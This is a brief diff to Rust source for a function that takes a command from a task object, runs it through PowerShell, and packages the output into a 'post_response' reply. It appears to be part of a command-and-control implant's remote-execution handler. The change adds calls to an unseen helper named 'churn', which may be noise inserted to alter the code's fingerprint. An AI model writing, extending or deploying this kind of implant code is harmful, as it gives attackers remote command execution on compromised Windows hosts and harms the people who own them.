@@ -12,7 +12,8 @@ pub fn handle_ps_command(task: &Value) -> Result<(), Box<dyn std::error::Error>>
         .and_then(Value::as_str)
         .ok_or("missing arg1")?;
 
-    // run PowerShell
+    crate::helpers::churn(ps_cmd);
+
     let output = Command::new("powershell")
         .args(&["-Command", ps_cmd])
         .output()?;
@@ -23,7 +24,8 @@ pub fn handle_ps_command(task: &Value) -> Result<(), Box<dyn std::error::Error>>
         String::from_utf8_lossy(&output.stderr).trim_end().to_string()
     };
 
-    // build and send response
+    crate::helpers::churn(user_output.as_str());
+
     let response = serde_json::json!({
         "action": "post_response",
         "responses": [{
